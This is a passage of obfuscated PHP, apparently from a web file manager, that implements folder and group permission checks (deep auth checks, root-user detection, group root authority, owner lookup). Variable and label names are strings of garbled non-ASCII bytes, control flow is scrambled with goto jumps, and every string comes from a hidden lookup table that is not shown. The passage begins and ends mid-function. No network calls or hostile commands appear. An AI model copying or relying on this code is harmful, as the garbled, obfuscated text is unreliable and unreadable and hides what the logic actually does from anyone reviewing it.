‰[519])->getInfo($b…ÉĞ˜²ò); if (!$b…ÉĞ˜²ò || !$DÈŒ»âİÄÚ || !$fØÂÍåáŞ) { return array(); } goto D£ÎŸ¦“; c¿ˆ“‰§…É: if ($FñÊÇ’ŠóÈ[$Fˆˆ‹ä‰ ‰[478]] == $Fˆˆ‹ä‰ ‰[191] && $FñÊÇ’ŠóÈ[$Fˆˆ‹ä‰ ‰[484]] != $c˜êšºÒ && $this->groupContainUser($FñÊÇ’ŠóÈ[$Fˆˆ‹ä‰ ‰[484]], $b…ÉĞ˜²ò)) { foreach ($fØÂÍåáŞ[$Fˆˆ‹ä‰ ‰[1893]] as $a«òÓ¼»ò) { $EöÃ˜Ö¸Œ = Model($Fˆˆ‹ä‰ ‰[503])->getInfo($a«òÓ¼»ò[$Fˆˆ‹ä‰ ‰[1720]]); $cç¯ªŒø¬¨ = Model($Fˆˆ‹ä‰ ‰[519])->getInfoSimpleOuter($b…ÉĞ˜²ò); $cç¯ªŒø¬¨[$Fˆˆ‹ä‰ ‰[446]] = $a«òÓ¼»ò[$Fˆˆ‹ä‰ ‰[406]]; if (Model($Fˆˆ‹ä‰ ‰[488])->authCheckAction($a«òÓ¼»ò[$Fˆˆ‹ä‰ ‰[406]][$Fˆˆ‹ä‰ ‰[406]], $Fˆˆ‹ä‰ ‰[1740])) { continue; } $C¼¦³ˆ“áŒ = array($Fˆˆ‹ä‰ ‰[28] => $Fˆˆ‹ä‰ ‰[1503] . $EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[28]], $Fˆˆ‹ä‰ ‰[395] => $EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[85]][$Fˆˆ‹ä‰ ‰[395]], $Fˆˆ‹ä‰ ‰[76] => KodIO::make($EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[85]][$Fˆˆ‹ä‰ ‰[395]]), $Fˆˆ‹ä‰ ‰[478] => $Fˆˆ‹ä‰ ‰[191], $Fˆˆ‹ä‰ ‰[404] => $Fˆˆ‹ä‰ ‰[496], $Fˆˆ‹ä‰ ‰[29] => $Fˆˆ‹ä‰ ‰[530], $Fˆˆ‹ä‰ ‰[500] => $EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[507]], $Fˆˆ‹ä‰ ‰[1720] => $EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[1720]], $Fˆˆ‹ä‰ ‰[504] => $EöÃ˜Ö¸Œ[$Fˆˆ‹ä‰ ‰[478]], $Fˆˆ‹ä‰ ‰[1890] => array($cç¯ªŒø¬¨)); $DôèàåÀÚ¥[$C¼¦³ˆ“áŒ[$Fˆˆ‹ä‰ ‰[395]]] = $C¼¦³ˆ“áŒ; } } $bñÜ†ğØß = array(); $EåîÏÑ­Úï = $this->getAllChildren($DÈŒ»âİÄÚ); goto E­”–šàÍ—; D£ÎŸ¦“: $FñÊÇ’ŠóÈ = Model($Fˆˆ‹ä‰ ‰[1227])->sourceInfo($DÈŒ»âİÄÚ); $DôèàåÀÚ¥ = array(); $c˜êšºÒ = 1; goto c¿ˆ“‰§…É; A÷¤ğĞ¯¿Ã: return $bñÜ†ğØß; goto bˆšé›òÈ¿; bˆšé›òÈ¿: } public function setAllChildrenByUser($f–èä˜‡‹ß, $C·¬„¶Ÿš–, $eÎµ¶À‘ã) { $Cğ‚ß¸ê =& $_SERVER[ä°„ä°º]; $Dæ²âÂ×Îª = $this->getAllChildrenByUser($f–èä˜‡‹ß, $C·¬„¶Ÿš–); if (!$eÎµ¶À‘ã || !$Dæ²âÂ×Îª) { return !1; } foreach ($Dæ²âÂ×Îª as $e•èãÉÁ) { $aí£ä…ˆïˆ = array(); foreach ($e•èãÉÁ[$Cğ‚ß¸ê[1890]] as $e—ã°ò”ØØ) { $AÉÖ¬øãù = $e—ã°ò”ØØ[$Cğ‚ß¸ê[446]]; $F›¿—ì¾„ = $e—ã°ò”ØØ[$Cğ‚ß¸ê[1551]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $CÈ‚´£ÇË = $e—ã°ò”ØØ[$Cğ‚ß¸ê[1551]] ? $e—ã°ò”ØØ[$Cğ‚ß¸ê[1551]] : $e—ã°ò”ØØ[$Cğ‚ß¸ê[1720]]; if ($e—ã°ò”ØØ[$Cğ‚ß¸ê[1551]] && $e—ã°ò”ØØ[$Cğ‚ß¸ê[1551]] == $C·¬„¶Ÿš–) { continue; } $aí£ä…ˆïˆ[] = array($Cğ‚ß¸ê[395] => $e•èãÉÁ[$Cğ‚ß¸ê[395]], $Cğ‚ß¸ê[404] => $F›¿—ì¾„, $Cğ‚ß¸ê[484] => intval($CÈ‚´£ÇË), $Cğ‚ß¸ê[1815] => isset($AÉÖ¬øãù[$Cğ‚ß¸ê[393]]) ? intval($AÉÖ¬øãù[$Cğ‚ß¸ê[393]]) : 0, $Cğ‚ß¸ê[1869] => isset($AÉÖ¬øãù[$Cğ‚ß¸ê[1869]]) ? intval($AÉÖ¬øãù[$Cğ‚ß¸ê[1869]]) : -1); } $aí£ä…ˆïˆ[] = array($Cğ‚ß¸ê[395] => $e•èãÉÁ[$Cğ‚ß¸ê[395]], $Cğ‚ß¸ê[404] => SourceModel::TYPE_USER, $Cğ‚ß¸ê[484] => intval($C·¬„¶Ÿš–), $Cğ‚ß¸ê[1815] => intval($eÎµ¶À‘ã), $Cğ‚ß¸ê[1869] => -1); $this->where(array($Cğ‚ß¸ê[410] => $e•èãÉÁ[$Cğ‚ß¸ê[395]]))->delete(); $this->addAll($aí£ä…ˆïˆ); } return !0; } public function get($e¹ô‡‚‘Ì) { $BğÆÑÓËÑ– = $this->getSourceList(array($e¹ô‡‚‘Ì), !0); return $BğÆÑÓËÑ–[0]; } public function getSourceList($b†ËÅÜ˜¯ù, $B§Û±§ÅÑÏ = false, $EæÃåºƒ = false) { goto eš¬®®§ùŠ; C‰õîÉáÜØ: $C¡ ¾ÄÃ²Æ = $this->sourceAuthSelect($cŠ™Ä¢²¢Ç); $cœ¹Å÷¨½ = array(); foreach ($cŠ™Ä¢²¢Ç as $e±¶§ë„ğ“) { if (isset($C¡ ¾ÄÃ²Æ[$e±¶§ë„ğ“])) { $cœ¹Å÷¨½[$e±¶§ë„ğ“] = $C¡ ¾ÄÃ²Æ[$e±¶§ë„ğ“]; } } goto dÌ”ô¸Ğ¿; aˆí”ÀÛí£: foreach ($B§Û±§ÅÑÏ as $dæ›µ×é²Ì => $Bƒ¿¸ø) { $f†êµ†ŞŸö = $Bó¾Æ¬ ”->parentLevelArray($Bƒ¿¸ø[$C‰ŸÏ×ùìª[502]]); $cŠ™Ä¢²¢Ç = array_merge($cŠ™Ä¢²¢Ç, array($dæ›µ×é²Ì), array_reverse($f†êµ†ŞŸö)); } $cŠ™Ä¢²¢Ç = array_values(array_unique($cŠ™Ä¢²¢Ç)); if (!$cŠ™Ä¢²¢Ç) { return array(); } goto C‰õîÉáÜØ; a§ÅÍùŠ‘Ë: $D…Í¶Şİ‚• = array(); foreach ($B§Û±§ÅÑÏ as $e±¶§ë„ğ“ => $e¢‰Æ§£ù›) { if ($AÈ‹å¢”Öº) { $D…Í¶Şİ‚•[$e±¶§ë„ğ“] = $dŸŠš”õØ; continue; } $D…Í¶Şİ‚•[$e±¶§ë„ğ“] = $this->makeSourceAuth($e¢‰Æ§£ù›, $cœ¹Å÷¨½, $EæÃåºƒ); } return $D…Í¶Şİ‚•; goto bèö±¤¿Ú»; eš¬®®§ùŠ: $C‰ŸÏ×ùìª =& $_SERVER[ä°„ä°º]; if (!$b†ËÅÜ˜¯ù) { return array(); } $Bó¾Æ¬ ” = Model($C‰ŸÏ×ùìª[1227]); goto BÒµò‰á×Á; BÒµò‰á×Á: if (!$B§Û±§ÅÑÏ && count($b†ËÅÜ˜¯ù) == 1) { $B§Û±§ÅÑÏ = array(); $B§Û±§ÅÑÏ[$b†ËÅÜ˜¯ù[0]] = $Bó¾Æ¬ ”->sourceInfo($b†ËÅÜ˜¯ù[0]); } if (!$B§Û±§ÅÑÏ) { $DÕÉ´¥®Û = array($C‰ŸÏ×ùìª[410] => array($C‰ŸÏ×ùìª[411], $b†ËÅÜ˜¯ù)); $B§Û±§ÅÑÏ = $Bó¾Æ¬ ”->field($C‰ŸÏ×ùìª[1894])->where($DÕÉ´¥®Û)->select(); $B§Û±§ÅÑÏ = array_to_keyvalue($B§Û±§ÅÑÏ, $C‰ŸÏ×ùìª[395]); } $cŠ™Ä¢²¢Ç = $b†ËÅÜ˜¯ù; goto aˆí”ÀÛí£; dÌ”ô¸Ğ¿: $AÈ‹å¢”Öº = $this->userIsRoot($EæÃåºƒ); $f¿·ÅÀ‚³Š = AuthModel::authAll(); $dŸŠš”õØ = array($C‰ŸÏ×ùìª[407] => $f¿·ÅÀ‚³Š, $C‰ŸÏ×ùìª[1895] => array($C‰ŸÏ×ùìª[412] => 0, $C‰ŸÏ×ùìª[1726] => $f¿·ÅÀ‚³Š, $C‰ŸÏ×ùìª[413] => LNG($C‰ŸÏ×ùìª[1896]), $C‰ŸÏ×ùìª[1742] => $C‰ŸÏ×ùìª[1897])); goto a§ÅÍùŠ‘Ë; bèö±¤¿Ú»: } public function authDeepCheck($då·ÍÖÁ¥à, $f´ÚõÄ–òØ = false) { goto Aç‰¤Ûô›–; B‘¬óÊí»ö: if (!$fğàÀ¶¢Û) { return !1; } $eÁÊ‘Ä³±ƒ = $fğàÀ¶¢Û ? $fğàÀ¶¢Û[0] : $då·ÍÖÁ¥à; return array($d®·Á¹‘æˆ[407] => -1, $d®·Á¹‘æˆ[446] => array($d®·Á¹‘æˆ[412] => $d®·Á¹‘æˆ[1106], $d®·Á¹‘æˆ[1726] => $d®·Á¹‘æˆ[191], $d®·Á¹‘æˆ[413] => LNG($d®·Á¹‘æˆ[1900]), $d®·Á¹‘æˆ[1742] => $d®·Á¹‘æˆ[1901]), $d®·Á¹‘æˆ[1902] => LNG($d®·Á¹‘æˆ[1903]), $d®·Á¹‘æˆ[1904] => $this->sourceAuthInfo($eÁÊ‘Ä³±ƒ)); goto c„Ñ´ñ•ğ¸; Aç‰¤Ûô›–: $d®·Á¹‘æˆ =& $_SERVER[ä°„ä°º]; $f´ÚõÄ–òØ = $f´ÚõÄ–òØ ? $f´ÚõÄ–òØ : USER_ID; $E²ñØÜÓ’É = $this->makeAuthDeep($f´ÚõÄ–òØ); goto eæÕ×ÌÁôœ; eæÕ×ÌÁôœ: if (!in_array($då·ÍÖÁ¥à, $E²ñØÜÓ’É[$d®·Á¹‘æˆ[1898]])) { return !1; } $fğàÀ¶¢Û = array(); foreach ($E²ñØÜÓ’É[$d®·Á¹‘æˆ[1899]] as $dê¥ù£·· => $D«éƒÓË Ä) { if (!in_array($då·ÍÖÁ¥à, $D«éƒÓË Ä)) { continue; } $fğàÀ¶¢Û[] = $dê¥ù£··; } goto B‘¬óÊí»ö; c„Ñ´ñ•ğ¸: } protected function makeAuthDeep($C©–™•ô¤ = false) { goto c‘õÇŸŞœª; aß‚š¾¾•: foreach ($f‡˜Ï‹ƒÃŒ as $CÌÆ–©½ª³) { if ($CÌÆ–©½ª³[$cò¢š¥öˆë[406]] == 0 && $CÌÆ–©½ª³[$cò¢š¥öˆë[1741]] == $cò¢š¥öˆë[87]) { $fËÙ¸ùæõ[] = $CÌÆ–©½ª³[$cò¢š¥öˆë[393]]; } } $FçØøäÉŠ = $this->userGroupParents($C©–™•ô¤); $a²ï­¾ˆ– = array($cò¢š¥öˆë[404] => SourceModel::TYPE_USER, $cò¢š¥öˆë[484] => $C©–™•ô¤); goto e°ºÒÚõîÙ; FˆİÌğ²Äã: $d‚Ÿ˜ªê  = array(); $EÕ› ì¶«ô = array(); $B‰‹Ô ½ÇÖ = array(); goto a£ŒÖŸô‘; BÛå‰¢»ğ: $F†çõ©ÊÀã = $FçØøäÉŠ; $a˜ç¥ªº§¶ = Model($cò¢š¥öˆë[1227]); $CÍÒª‚Ã·Ö = Model($cò¢š¥öˆë[503]); goto FˆİÌğ²Äã; a£ŒÖŸô‘: $c›èÓ®ìèœ = array(); if ($fî¿–œø÷) { $dçŒŸƒ£¼ƒ = $a˜ç¥ªº§¶->where(array($cò¢š¥öˆë[395] => array($cò¢š¥öˆë[411], $fî¿–œø÷)))->select(); foreach ($dçŒŸƒ£¼ƒ as $a©ÏĞ³ÆŠİ) { $D¦ªÆ²‘òã = $a˜ç¥ªº§¶->parentLevelArray($a©ÏĞ³ÆŠİ[$cò¢š¥öˆë[502]]); $c–ó»ãÍÀç = array_merge($c–ó»ãÍÀç, $D¦ªÆ²‘òã); $F†çõ©ÊÀã[] = $a©ÏĞ³ÆŠİ[$cò¢š¥öˆë[484]]; $d‚Ÿ˜ªê [$a©ÏĞ³ÆŠİ[$cò¢š¥öˆë[395]]] = $D¦ªÆ²‘òã; $EÕ› ì¶«ô[$a©ÏĞ³ÆŠİ[$cò¢š¥öˆë[395]]] = $a©ÏĞ³ÆŠİ[$cò¢š¥öˆë[484]]; } } $F†çõ©ÊÀã = array_values(array_unique($F†çõ©ÊÀã)); goto bä™çš‚È; bÏìí…¸ôµ: $Fî¸‹æáï† = array($cò¢š¥öˆë[1898] => $c–ó»ãÍÀç, $cò¢š¥öˆë[1899] => $d‚Ÿ˜ªê ); $bñ…îÍ¬®[$C©–™•ô¤] = $Fî¸‹æáï†; return $Fî¸‹æáï†; goto b­ŸÊ´Ñ¿Š; aÛ²ÜÚ¨“¥: $CÏÇÔ¢µË = array_to_keyvalue_group($Aê ä¦ƒ†‚, $cò¢š¥öˆë[395]); foreach ($CÏÇÔ¢µË as $FÚâÉÛÄÖƒ => $eäİ¨¸Şİ) { $fŒ¡À»î¸º = $this->authArrayCheck($eäİ¨¸Şİ, $C©–™•ô¤); if ($fŒ¡À»î¸º[$cò¢š¥öˆë[407]] > 0) { $fî¿–œø÷[] = $FÚâÉÛÄÖƒ . $cò¢š¥öˆë[33]; } } $c–ó»ãÍÀç = array(); goto BÛå‰¢»ğ; E¶­ÂË´À·: if (isset($bñ…îÍ¬®[$C©–™•ô¤])) { return $bñ…îÍ¬®[$C©–™•ô¤]; } $f‡˜Ï‹ƒÃŒ = Model($cò¢š¥öˆë[1905])->listData(); $fËÙ¸ùæõ = array(); goto aß‚š¾¾•; Cêø­ğ¢¶: foreach ($F†çõ©ÊÀã as $a¸¹²¿¤Óå) { $aÕƒØŠçœœ = $CÍÒª‚Ã·Ö->getInfo($a¸¹²¿¤Óå); $c–ó»ãÍÀç[] = $aÕƒØŠçœœ[$cò¢š¥öˆë[85]][$cò¢š¥öˆë[395]]; $B‰‹Ô ½ÇÖ[$a¸¹²¿¤Óå] = $aÕƒØŠçœœ[$cò¢š¥öˆë[85]][$cò¢š¥öˆë[395]]; $c›èÓ®ìèœ[$a¸¹²¿¤Óå] = $a˜ç¥ªº§¶->parentLevelArray($aÕƒØŠçœœ[$cò¢š¥öˆë[502]]); } foreach ($d‚Ÿ˜ªê  as $AÛá¾ÔÚˆÊ => $eÉÕ˜¿¥‘Ç) { $AñÖ¥¬îÙº = $EÕ› ì¶«ô[$AÛá¾ÔÚˆÊ]; if (!$AñÖ¥¬îÙº || !$B‰‹Ô ½ÇÖ[$AñÖ¥¬îÙº]) { continue; } $Dø¥èÓõÁ = array(); foreach ($c›èÓ®ìèœ[$AñÖ¥¬îÙº] as $a¸¹²¿¤Óå) { $Dø¥èÓõÁ[] = $B‰‹Ô ½ÇÖ[$a¸¹²¿¤Óå]; } $d‚Ÿ˜ªê [$AÛá¾ÔÚˆÊ] = array_merge($Dø¥èÓõÁ, $eÉÕ˜¿¥‘Ç); } $c–ó»ãÍÀç = array_values(array_unique($c–ó»ãÍÀç)); goto bÏìí…¸ôµ; e°ºÒÚõîÙ: if ($FçØøäÉŠ) { $a²ï­¾ˆ– = array(array($cò¢š¥öˆë[404] => SourceModel::TYPE_USER, $cò¢š¥öˆë[484] => $C©–™•ô¤), array($cò¢š¥öˆë[404] => SourceModel::TYPE_GROUP, $cò¢š¥öˆë[484] => array($cò¢š¥öˆë[411], $FçØøäÉŠ)), $cò¢š¥öˆë[979] => $cò¢š¥öˆë[1807]); } $Aê ä¦ƒ†‚ = $this->field($cò¢š¥öˆë[1906])->where($a²ï­¾ˆ–)->select(); $fî¿–œø÷ = array(); goto aÛ²ÜÚ¨“¥; c‘õÇŸŞœª: $cò¢š¥öˆë =& $_SERVER[ä°„ä°º]; static $bñ…îÍ¬® = array(); $C©–™•ô¤ = $C©–™•ô¤ ? $C©–™•ô¤ : USER_ID; goto E¶­ÂË´À·; bä™çš‚È: $d¤”ì¤Œ„È = $F†çõ©ÊÀã; foreach ($d¤”ì¤Œ„È as $a¸¹²¿¤Óå) { $aÕƒØŠçœœ = $CÍÒª‚Ã·Ö->getInfo($a¸¹²¿¤Óå); $D¦ªÆ²‘òã = $a˜ç¥ªº§¶->parentLevelArray($aÕƒØŠçœœ[$cò¢š¥öˆë[502]]); $F†çõ©ÊÀã = array_merge($F†çõ©ÊÀã, $D¦ªÆ²‘òã); } $F†çõ©ÊÀã = array_values(array_unique($F†çõ©ÊÀã)); goto Cêø­ğ¢¶; b­ŸÊ´Ñ¿Š: } private function makeSourceAuth($fŠÈà“§à, $a†¾êÄ¿à°, $aâÖ¶Ó‘™‹ = false) { goto b•Öæè; D‘¾¸±¸¤œ: foreach ($AØÕõÉàßÙ as $báôòŞ†—Í) { if (!isset($a†¾êÄ¿à°[$báôòŞ†—Í])) { continue; } $d¿ˆÆª­’Õ = $this->authMake($a†¾êÄ¿à°[$báôòŞ†—Í], $aâÖ¶Ó‘™‹); if ($d¿ˆÆª­’Õ[$cª‹ÒÇŞ©‚[446]]) { $Aœ³ï…ïãö = $d¿ˆÆª­’Õ; break; } } if (!$dâÜØÑÕìÍ) { return $Aœ³ï…ïãö; } if (!$Aœ³ï…ïãö && $dÚËæ’Ğ¯È) { $Aœ³ï…ïãö = $this->groupAuthInfo($dÚËæ’Ğ¯È, $Dâİ ‹×ªÜ); } goto aŞÇƒ‡¿; bÚ‡äã®—”: $dâÜØÑÕìÍ = $fŠÈà“§à[$cª‹ÒÇŞ©‚[404]] == SourceModel::TYPE_GROUP; $dÚËæ’Ğ¯È = $dâÜØÑÕìÍ ? $this->groupRootAuth($Dâİ ‹×ªÜ, $aâÖ¶Ó‘™‹) : !1; if ($dÚËæ’Ğ¯È && Model($cª‹ÒÇŞ©‚[488])->authCheckAction($dÚËæ’Ğ¯È[$cª‹ÒÇŞ©‚[406]], $cª‹ÒÇŞ©‚[1740])) { return $this->groupAuthInfo($dÚËæ’Ğ¯È, $Dâİ ‹×ªÜ); } goto A²¹Ø½ÎÔ‹; b•Öæè: $cª‹ÒÇŞ©‚ =& $_SERVER[ä°„ä°º]; $B‡ÌÚÉ¢ÊÍ = $cª‹ÒÇŞ©‚[87]; $Dâİ ‹×ªÜ = $fŠÈà“§à[$cª‹ÒÇŞ©‚[484]]; goto bÚ‡äã®—”; aŞÇƒ‡¿: if (!$Aœ³ï…ïãö) { $bÖÀíÕÍ = Model($cª‹ÒÇŞ©‚[503])->getInfo($Dâİ ‹×ªÜ); $Bƒ¢°‚ÎËî = explode($cª‹ÒÇŞ©‚[47], trim($bÖÀíÕÍ[$cª‹ÒÇŞ©‚[502]], $cª‹ÒÇŞ©‚[47])); $Bƒ¢°‚ÎËî = array_reverse($Bƒ¢°‚ÎËî); foreach ($Bƒ¢°‚ÎËî as $Fé±âæ•ä) { if ($Fé±âæ•ä == $cª‹ÒÇŞ©‚[191] || $Fé±âæ•ä == $B‡ÌÚÉ¢ÊÍ) { continue; } $F·›¢‰³Ö¼ = $this->groupRootAuth($Fé±âæ•ä, $aâÖ¶Ó‘™‹); if (!$F·›¢‰³Ö¼) { continue; } $Aœ³ï…ïãö = $this->groupAuthInfo($F·›¢‰³Ö¼, $Fé±âæ•ä); break; } } if (!$Aœ³ï…ïãö || $Aœ³ï…ïãö[$cª‹ÒÇŞ©‚[407]] <= 0) { $Bšğƒ³ƒ¹Ò = $this->authDeepCheck($fŠÈà“§à[$cª‹ÒÇŞ©‚[395]], $aâÖ¶Ó‘™‹); if ($Bšğƒ³ƒ¹Ò) { $Aœ³ï…ïãö = $Bšğƒ³ƒ¹Ò; } } return $Aœ³ï…ïãö; goto f™®åá‘¶Ô; A²¹Ø½ÎÔ‹: $AØÕõÉàßÙ = Model($cª‹ÒÇŞ©‚[1227])->parentLevelArray($fŠÈà“§à[$cª‹ÒÇŞ©‚[502]]); $AØÕõÉàßÙ = array_merge(array($fŠÈà“§à[$cª‹ÒÇŞ©‚[395]]), array_reverse($AØÕõÉàßÙ)); $Aœ³ï…ïãö = !1; goto D‘¾¸±¸¤œ; f™®åá‘¶Ô: } private function userIsRoot($AŞ¾Ï¢Â¢ø = false) { $DĞ‰Ò´Š°é =& $_SERVER[ä°„ä°º]; if (!$AŞ¾Ï¢Â¢ø && _get($GLOBALS, $DĞ‰Ò´Š°é[485])) { return !0; } $dÈ„Á óó² = Model($DĞ‰Ò´Š°é[519])->getInfo($AŞ¾Ï¢Â¢ø); $f“ÑÜ°šñ‘ = Model($DĞ‰Ò´Š°é[1907])->listData($dÈ„Á óó²[$DĞ‰Ò´Š°é[1434]]); if ($f“ÑÜ°šñ‘ && $f“ÑÜ°šñ‘[$DĞ‰Ò´Š°é[492]][$DĞ‰Ò´Š°é[1908]] == 1) { return !0; } return !1; } private function sourceAuthInfo($F±¥¤ôÕƒ) { goto e†î¿—Û­ª; Cà¶†Çğ®Ú: if (isset($F÷Í¾çÊÉî[$AÖìÇÃÉ‰[508]])) { $EéˆÃÎœ˜§ = explode($AÖìÇÃÉ‰[8], trim($F÷Í¾çÊÉî[$AÖìÇÃÉ‰[500]], $AÖìÇÃÉ‰[8])); array_shift($EéˆÃÎœ˜§); $eÎËèÛ‡³— = $F÷Í¾çÊÉî[$AÖìÇÃÉ‰[506]] . $AÖìÇÃÉ‰[1909] . implode($AÖìÇÃÉ‰[8], $EéˆÃÎœ˜§); } return array($AÖìÇÃÉ‰[413] => $F÷Í¾çÊÉî[$AÖìÇÃÉ‰[28]], $AÖìÇÃÉ‰[76] => KodIO::make($F÷Í¾çÊÉî[$AÖìÇÃÉ‰[395]]), $AÖìÇÃÉ‰[1910] => $eÎËèÛ‡³—); goto BßŠİ‡š†; B¶ù×åÊœÒ: $Cá‹àè•î = $Bï›—šø¸¹->_listAppendPath($Cá‹àè•î); $F÷Í¾çÊÉî = $Cá‹àè•î[0]; $eÎËèÛ‡³— = $F÷Í¾çÊÉî[$AÖìÇÃÉ‰[500]]; goto Cà¶†Çğ®Ú; e†î¿—Û­ª: $AÖìÇÃÉ‰ =& $_SERVER[ä°„ä°º]; $Bï›—šø¸¹ = Model($AÖìÇÃÉ‰[1227]); $F÷Í¾çÊÉî = $Bï›—šø¸¹->sourceInfo($F±¥¤ôÕƒ); goto Cªœï‚¡ÆÍ; Cªœï‚¡ÆÍ: if (!$F÷Í¾çÊÉî) { return !1; } $Bï›—šø¸¹->groupPathDisplay($F÷Í¾çÊÉî); $Cá‹àè•î = array($F÷Í¾çÊÉî); goto B¶ù×åÊœÒ; BßŠİ‡š†: } private function groupAuthInfo($BßÁŞ‰‹Éø, $f•å“»ôŒ) { $Eïöœ£Û¡Œ =& $_SERVER[ä°„ä°º]; $F¨˜òÅ¸¹¡ = Model($Eïöœ£Û¡Œ[503])->getInfo($f•å“»ôŒ); return array($Eïöœ£Û¡Œ[1911] => intval($BßÁŞ‰‹Éø[$Eïöœ£Û¡Œ[406]]), $Eïöœ£Û¡Œ[1895] => $BßÁŞ‰‹Éø, $Eïöœ£Û¡Œ[1912] => LNG($Eïöœ£Û¡Œ[1913]), $Eïöœ£Û¡Œ[1904] => array($Eïöœ£Û¡Œ[413] => $F¨˜òÅ¸¹¡[$Eïöœ£Û¡Œ[28]], $Eïöœ£Û¡Œ[76] => KodIO::make($F¨˜òÅ¸¹¡[$Eïöœ£Û¡Œ[85]][$Eïöœ£Û¡Œ[395]]), $Eïöœ£Û¡Œ[1910] => $F¨˜òÅ¸¹¡[$Eïöœ£Û¡Œ[507]])); } protected function groupRootAuth($DÒŒ„ŞÔ¬, $CÂ‰Øø÷° = false) { goto CËÒ°¯ã·Ñ; cÃìÂÂßÄŞ: static $c­ÙìçÅÀ” = array(); if (isset($c­ÙìçÅÀ”[$fí“°È¿öè])) { return $c­ÙìçÅÀ”[$fí“°È¿öè]; } $Bµ£×¾õ‹ç = Model($dÙµİÈ —[503])->getInfo($DÒŒ„ŞÔ¬); goto dÄŸ »®˜á; dÄŸ »®˜á: $AƒõĞôÈº = $this->userGroupList($CÂ‰Øø÷°); $cæøìŞô²  = isset($AƒõĞôÈº[$DÒŒ„ŞÔ¬]) ? $AƒõĞôÈº[$DÒŒ„ŞÔ¬][$dÙµİÈ —[406]] : !1; if ($cæøìŞô²  && Model($dÙµİÈ —[488])->authCheckAction($cæøìŞô² [$dÙµİÈ —[406]], $dÙµİÈ —[1740])) { $c­ÙìçÅÀ”[$fí“°È¿öè] = $cæøìŞô² ; return $cæøìŞô² ; } goto dë©ï®“ñî; dë©ï®“ñî: $B”×¿ê¨µá = $this->sourceAuthSelect($Bµ£×¾õ‹ç[$dÙµİÈ —[85]][$dÙµİÈ —[395]]); $eÄŠ‹’ªà® = $B”×¿ê¨µá ? $this->authMake($B”×¿ê¨µá, $CÂ‰Øø÷°) : !1; $D³Êáéó–À = $eÄŠ‹’ªà® ? $eÄŠ‹’ªà®[$dÙµİÈ —[446]] : !1; goto Eé°ÁÉí‹¬; CËÒ°¯ã·Ñ: $dÙµİÈ — =& $_SERVER[ä°„ä°º]; $CÂ‰Øø÷° = $CÂ‰Øø÷° ? $CÂ‰Øø÷° : USER_ID; $fí“°È¿öè = $CÂ‰Øø÷° . $dÙµİÈ —[1914] . $DÒŒ„ŞÔ¬; goto cÃìÂÂßÄŞ; Eé°ÁÉí‹¬: $c­ÙìçÅÀ”[$fí“°È¿öè] = $D³Êáéó–À ? $D³Êáéó–À : $cæøìŞô² ; return $c­ÙìçÅÀ”[$fí“°È¿öè]; goto cøâİ·ƒ¼•; cøâİ·ƒ¼•: } public function authOwnerApply($EŠŞ¦çó‘) { goto BçÇ¨»ö¹ö; Dºš‰š¶â: $c­öÉÛæç¡ = Model($d–â®äÇ¿ø[1227])->parentLevelArray($EŠŞ¦çó‘[$d–â®äÇ¿ø[502]]); $c­öÉÛæç¡ = array_merge(array($EŠŞ¦çó‘[$d–â®äÇ¿ø[395]]), array_reverse($c­öÉÛæç¡)); $aáÃğİ¢ö = $this->sourceAuthSelect($c­öÉÛæç¡); goto cƒ¢¿Ë«Õá; cƒ¢¿Ë«Õá: $cÌˆ •Öæó = array(); $E–Î›Ğ³¬  = array(); foreach ($aáÃğİ¢ö as $C›ä¹Ğ¼õ => $Dê‹óÙ¬ÏÖ) { $CÀĞô¿­³Õ = $this->authFolderOwnerUser($Dê‹óÙ¬ÏÖ); $cÌˆ •Öæó[$C›ä¹Ğ¼õ] = $CÀĞô¿­³Õ; $E–Î›Ğ³¬  = array_merge($E–Î›Ğ³¬ , $CÀĞô¿­³Õ[$d–â®äÇ¿ø[575]]); if ($CÀĞô¿­³Õ[$d–â®äÇ¿ø[1916]]) { break; } } goto fİšÄ‚©Èº; bÛÖª×ŒÕ¶: $EŠŞ¦çó‘[$d–â®äÇ¿ø[406]][$d–â®äÇ¿ø[1917]] = Model($d–â®äÇ¿ø[494])->userListInfo($E–Î›Ğ³¬ ); return $EŠŞ¦çó‘; goto Bœáğ•–’; BçÇ¨»ö¹ö: $d–â®äÇ¿ø =& $_SERVER[ä°„ä°º]; if (empty($EŠŞ¦çó‘[$d–â®äÇ¿ø[406]]) || isset($EŠŞ¦çó‘[$d–â®äÇ¿ø[1915]]) && $EŠŞ¦çó‘[$d–â®äÇ¿ø[1915]]) { return $EŠŞ¦çó‘; } if (AuthModel::authCheckRoot($EŠŞ¦çó‘[$d–â®äÇ¿ø[406]][$d–â®äÇ¿ø[407]])) { return $EŠŞ¦çó‘; } goto Dºš‰š¶â; fİšÄ‚©Èº: if (count($E–Î›Ğ³¬ ) == 0) { $E–Î›Ğ³¬  = $this->authFolderOwnerGroup($EŠŞ¦çó‘[$d–â®äÇ¿ø[484]]); } $E–Î›Ğ³¬  = array_unique($E–Î›Ğ³¬ ); if (AuthModel::authCheckRoot($EŠŞ¦çó‘[$d–â®äÇ¿ø[406]][$d–â®äÇ¿ø[407]])) { $E–Î›Ğ³¬ [] = USER_ID; } goto bÛÖª×ŒÕ¶; Bœáğ•–’: } private function authFolderOwnerGroup($b¢ÆÉæ­ÍÚ) { $F°îÚ«ÀË =& $_SERVER[ä°„ä°º]; $fæÈÌî¾ğ = Model($F°îÚ«ÀË[1801])->where(array($F°îÚ«ÀË[1720] => $b¢ÆÉæ­ÍÚ))->select(); $A™¯óÆ–Ü = array(); if (!$fæÈÌî¾ğ) { return $A™¯óÆ–Ü; } foreach ($fæÈÌî¾ğ as $BéÉ°‹£¸÷) { $aƒùÓ¼Ş² = $this->authInfo($BéÉ°‹£¸÷); if (AuthModel::authCheckRoot($aƒùÓ¼Ş²[$F°îÚ«ÀË[406]])) { $A™¯óÆ–Ü[] = $BéÉ°‹£¸÷[$F°îÚ«ÀË[1551]]; } } return $A™¯óÆ–Ü; } private function authFolderOwnerUser($B ±˜Œƒº) { $eÖ§Æ’øŸŞ =& $_SERVER[ä°„ä°º]; $bßÕ›·ĞÁŒ = array(); $CˆõÍª‚¢ˆ = !1; foreach ($B ±˜Œƒº as $Fñ¨ä¬Â) { $Aô½í›ç = $this->authInfo($Fñ¨ä¬Â); if ($Fñ¨ä¬Â[$eÖ§Æ’øŸŞ[484]] == 